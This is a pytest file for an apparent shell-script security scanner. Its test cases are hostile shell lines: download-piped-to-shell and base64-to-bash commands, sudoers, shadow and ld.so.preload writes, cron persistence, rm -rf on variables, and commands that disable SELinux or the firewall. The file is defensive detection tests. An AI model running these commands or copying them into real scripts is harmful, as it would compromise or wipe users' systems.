"""One snippet per rule behaviour, run through the syntax-tree rules and the
regex fallback.

CASES must come out the same under both engines. TREE_CASES are where the
syntax tree knows better (a heredoc is data, a variable is a constant) and the
regex rules over-report by design; those check the tree engine's answer and
that the regex rules still fire. The fallback may over-flag, never under-flag:
test_engine_findings_are_a_subset_of_regex checks that on every snippet here.
"""

from __future__ import annotations

import pytest

from chkscript.models import Finding, ScriptBundle
from chkscript.preprocess import preprocess
from chkscript.static import engine, regex_rules, rules
from tests.conftest import require_tool
from tests.test_rule_spans import CASES as SPAN_CASES

# (rule id, script body, should fire)
CASES: list[tuple[str, str, bool]] = [
    ("curl-pipe-shell", "curl -fsSL https://x.example/i.sh | sh", True),
    ("curl-pipe-shell", "wget -qO- https://x.example/i.sh | sudo bash", True),
    ("curl-pipe-shell", "curl -s https://x.example/i | tee /tmp/l | zsh", True),
    ("curl-pipe-shell", "curl -fsSL https://x.example/i.sh -o i.sh", False),
    ("curl-pipe-shell", "# curl https://x.example/i.sh | sh", False),
    ("curl-pipe-shell", "c=curl\n$c -fsSL https://x.example/i.sh | sh", True),
    ("curl-pipe-shell", "curl -fsSL https://x.example/i.sh | $SH", True),
    ("curl-pipe-shell", "bash -c 'curl -fsSL https://x.example | sh'", True),
    ("curl-pipe-shell", "bash <<< 'curl https://x.example/i | sh'", True),
    ("curl-pipe-shell", "bash -c 'c=curl; $c https://x.example/i | sh'", True),
    # A function's local says nothing about the global of the same name.
    (
        "curl-pipe-shell",
        'f() { local receiver=cat; }\ncurl https://x.example/i | "$receiver"',
        True,
    ),
    ("eval-dynamic", 'eval "$cmd"', True),
    ("eval-dynamic", "eval $(echo hi)", True),
    ("eval-dynamic", 'eval "echo $X"', True),
    ("eval-dynamic", 'eval "echo hi"', False),
    # Knowing a variable's value does not make eval of it literal code.
    ("eval-dynamic", "cmd='curl https://x.example/i | sh'\neval \"$cmd\"", True),
    ("decode-to-shell", "echo aGk= | base64 -d | bash", True),
    ("decode-to-shell", "base64 --decode payload | sh", True),
    ("decode-to-shell", "echo x | xxd -r -p | sh", True),
    ("decode-to-shell", "openssl enc -aes-256-cbc -d -in f | bash", True),
    ("decode-to-shell", "gunzip -c p.gz | sh", True),
    ("decode-to-shell", "gunzip p.gz", False),
    ("decode-to-shell", "echo aGk= | base64 -d > out.txt", False),
    ("write-system-auth-file", "echo 'x ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers", True),
    ("write-system-auth-file", "echo x | sudo tee /etc/sudoers.d/x", True),
    ("write-system-auth-file", "echo /tmp/x.so > /etc/ld.so.preload", True),
    ("write-system-auth-file", "cp shadow.bak /etc/shadow", True),
    ("write-system-auth-file", 'echo x | sudo tee "/etc/sudoers.d/$NAME"', True),
    ("write-system-auth-file", ">/etc/shadow", True),
    ("write-system-auth-file", "X=1 >/etc/shadow", True),
    ("write-system-auth-file", "grep root /etc/passwd", False),
    ("persistence-append", "echo 'export X=1' >> ~/.bashrc", True),
    ("persistence-append", 'echo "run" >> "$HOME/.zshrc"', True),
    ("persistence-append", "echo x | sudo tee -a ~/.profile", True),
    ("persistence-append", "(crontab -l; echo '* * * * * /tmp/x') | crontab -", True),
    ("persistence-append", "cp x.service /etc/systemd/system/x.service", True),
    ("persistence-append", "crontab -l", False),
    ("persistence-append", "cat ~/.bashrc", False),
    ("insecure-permissions", "chmod 777 /tmp/foo", True),
    ("insecure-permissions", "chmod +s /usr/local/bin/tool", True),
    ("insecure-permissions", "chmod 4755 /usr/local/bin/tool", True),
    ("insecure-permissions", 'chown root:root "$HOME/bin/tool"', True),
    ("insecure-permissions", "sudo chmod -R 777 /opt/x", True),
    ("insecure-permissions", "chmod 755 /usr/local/bin/tool", False),
    ("insecure-permissions", "chown root:root /usr/local/bin/tool", False),
    ("rm-rf-variable", 'rm -rf "$DIR/"', True),
    ("rm-rf-variable", "rm -fr ${PREFIX}/lib", True),
    ("rm-rf-variable", 'rm -r -f "$TMP"', True),
    ("rm-rf-variable", 'DIR=\nrm -rf "$DIR/"', True),
    ("rm-rf-variable", 'DIR=/\nrm -rf --no-preserve-root "$DIR"', True),
    ("rm-rf-variable", "DIR=/\nrm -rf $DIR", True),
    ("rm-rf-variable", "rm -rf /tmp/build", False),
    ("rm-rf-variable", 'rm -f "$TMP/x"', False),
    ("disable-security", "setenforce 0", True),
    ("disable-security", "ufw disable", True),
    ("disable-security", "systemctl disable --now apparmor", True),
    ("disable-security", "sudo systemctl disable --now cups apparmor", True),
    ("disable-security", "systemctl disable cups", False),
    ("http-download", "curl -o f http://example.com/f", True),
    ("http-download", "wget http://example.com/f.tar.gz", True),
    ("http-download", "curl -o f https://example.com/f", False),
    ("http-download", "echo see http://example.com", False),
    (
        "unverified-download",
        "curl -fsSL -o /tmp/t https://x.example/t\nchmod +x /tmp/t",
        True,
    ),
    (
        "unverified-download",
        "wget -O /tmp/t https://x.example/t\nchmod 755 /tmp/t",
        True,
    ),
    (
        "unverified-download",
        "# verified with sha256sum\ncurl -o /tmp/t https://x.example/t\n"
        "chmod +x /tmp/t",
        True,
    ),
    (
        "unverified-download",
        "curl -o /tmp/t https://x.example/t\nsha256sum -c t.sha256\nchmod +x /tmp/t",
        False,
    ),
    (
        "unverified-download",
        "curl -o /tmp/t https://x.example/t\ncosign verify-blob t\nchmod +x /tmp/t",
        False,
    ),
    ("unverified-download", "chmod +x ./build.sh", False),
    # Per downloaded file: verifying one download does not cover another.
    (
        "unverified-download",
        "curl -o /tmp/a https://x.example/a\ncurl -o /tmp/b https://x.example/b\n"
        "sha256sum /tmp/a\nchmod +x /tmp/b",
        True,
    ),
    (
        "unverified-download",
        "curl -o /tmp/a https://x.example/a\ncurl -o /tmp/b https://x.example/b\n"
        "sha256sum /tmp/a\nchmod +x /tmp/a",
        False,
    ),
    # Tied through an archive: download $exe.zip, unzip, chmod $exe.
    (
        "unverified-download",
        'curl -o "$exe.zip" https://x.example/t.zip\nunzip "$exe.zip"\n'
        'chmod +x "$exe"',
        True,
    ),
    # Backslash continuations: both engines see the command on its first line.
    ("rm-rf-variable", 'rm -rf \\\n  "$DIR"', True),
    ("curl-pipe-shell", "curl -fsSL https://x.example/i.sh \\\n  | sh", True),
    ("curl-pipe-shell", "cu\\\nrl -fsSL https://x.example/i.sh | sh", True),
    # A backslash ending a comment does not continue it, so the next line runs.
    ("rm-rf-variable", '# clean up \\\nrm -rf "$DIR"', True),
]

# (rule id, script body, does the syntax-tree engine fire): the regex rules
# fire on every one of these.
TREE_CASES: list[tuple[str, str, bool]] = [
    # Text inside a string or a printed heredoc is data.
    ("curl-pipe-shell", 'echo "run: curl https://x.example/i.sh | sh"', False),
    ("curl-pipe-shell", "cat <<EOF\ncurl https://x.example/i.sh | sh\nEOF", False),
    ("eval-dynamic", 'cat <<EOS\n  eval "$(brew shellenv)"\nEOS', False),
    # A heredoc fed to a shell is code, reported on its own line.
    ("rm-rf-variable", 'sh <<EOF\nrm -rf "$X"\nEOF', True),
    # `| sudo tee` writes a file; it does not run the download.
    ("curl-pipe-shell", "curl -fsSL https://x.example/k | sudo tee /etc/k", False),
    # A constant path is not a variable that can be empty.
    ("rm-rf-variable", 'DIR=/opt/x\nrm -rf "$DIR/"', False),
    # The chmod'ed file is not the download.
    (
        "unverified-download",
        "curl -o /tmp/t https://x.example/t\nchmod +x ./build.sh",
        False,
    ),
    # A function that downloads its arguments is followed to the call.
    (
        "unverified-download",
        'dl() {\n  curl -fsSL -o "$2" "$1"\n}\ndl https://x.example/t /tmp/t\n'
        "chmod +x /tmp/t",
        True,
    ),
]


def _bundle(body: str) -> ScriptBundle:
    return preprocess(f"#!/bin/bash\n{body}\n".encode())


def _rule_ids(findings: list[Finding]) -> set[str]:
    return {f.rule_id for f in findings if f.rule_id in rules.RULE_IDS}


def _tree(bundle: ScriptBundle) -> list[Finding]:
    require_tool("shfmt")
    outcome = engine.scan(bundle)
    assert outcome.parsed, f"shfmt did not parse: {bundle.text!r}"
    return outcome.findings


def _regex(bundle: ScriptBundle) -> list[Finding]:
    return regex_rules.run(bundle)


def _ids(cases: list[tuple[str, str, bool]]) -> list[str]:
    return [f"{r}-{i}-{'hit' if f else 'miss'}" for i, (r, _, f) in enumerate(cases)]


@pytest.mark.parametrize("engine_name", ["shfmt", "regex"])
@pytest.mark.parametrize(("rule_id", "body", "fires"), CASES, ids=_ids(CASES))
def test_rule(engine_name: str, rule_id: str, body: str, fires: bool) -> None:
    run = _tree if engine_name == "shfmt" else _regex
    assert (rule_id in _rule_ids(run(_bundle(body)))) is fires


@pytest.mark.parametrize(("rule_id", "body", "fires"), TREE_CASES, ids=_ids(TREE_CASES))
def test_tree_rule(rule_id: str, body: str, fires: bool) -> None:
    bundle = _bundle(body)
    assert (rule_id in _rule_ids(_tree(bundle))) is fires
    assert rule_id in _rule_ids(_regex(bundle)), "the fallback must over-report"


ALL_BODIES = sorted(
    {body for _, body, _ in CASES}
    | {body for _, body, _ in TREE_CASES}
    | {body for _, body in SPAN_CASES}
)


@pytest.mark.parametrize("body", ALL_BODIES, ids=lambda body: repr(body)[:40])
def test_engine_findings_are_a_subset_of_regex(body: str) -> None:
    """Every (rule, line) the tree engine reports, the regex rules report too."""
    bundle = _bundle(body)
    tree = {(f.rule_id, f.line) for f in _tree(bundle)}
    regex = {(f.rule_id, f.line) for f in _regex(bundle)}
    assert tree <= regex


def test_every_rule_has_a_hit_and_a_miss() -> None:
    for rule_id in rules.RULE_IDS:
        outcomes = {fires for r, _, fires in CASES if r == rule_id}
        assert outcomes == {True, False}, rule_id


def test_engines_share_rule_ids_and_messages() -> None:
    regex_ids = {
        r.rule_id for r in (*regex_rules.LINE_RULES, regex_rules.UNVERIFIED_DOWNLOAD)
    }
    assert regex_ids == rules.RULE_IDS
    for rule in (*regex_rules.LINE_RULES, regex_rules.UNVERIFIED_DOWNLOAD):
        assert rule.message == rules.MESSAGES[rule.rule_id]


def test_tree_findings_use_source_shfmt() -> None:
    [finding] = _tree(_bundle("curl -fsSL https://x.example/i.sh | sh"))
    assert finding.source == "shfmt"
    assert finding.line == 2
    assert finding.description == rules.MESSAGES["curl-pipe-shell"]


def test_unparseable_embedded_code_falls_back_to_regex() -> None:
    findings = _tree(_bundle("bash -c 'if then (( curl x | sh'"))
    pipe = [f for f in findings if f.rule_id == "curl-pipe-shell"]
    assert [(f.source, f.line) for f in pipe] == [("regex", 2)]
